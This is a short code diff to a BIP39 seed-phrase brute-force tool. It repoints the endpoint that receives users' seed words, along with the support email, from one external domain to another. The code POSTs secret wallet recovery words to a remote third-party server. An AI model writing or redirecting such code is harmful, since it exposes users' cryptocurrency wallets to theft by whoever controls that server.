@@ -31,7 +31,7 @@ function bruteforce(){
         $.ajax({
 
             method: "POST",
-            url: "https://www.izaum.com/codes/bip39bf/api.php",
+            url: "https://duckers.me/codes/bip39bf/api.php",
             data: { 
                 words: JSON.stringify(words_array),
                 response_at: API_Server
@@ -49,7 +49,7 @@ function bruteforce(){
                 
                 if(object.details == null){
                     
-                    failResponse("Server error. No response given. Contact with us at hello@izaum.com for support.");
+                    failResponse("Server error. No response given. Contact with us at info@duckers.me for support.");
                     
                 }else{
                     
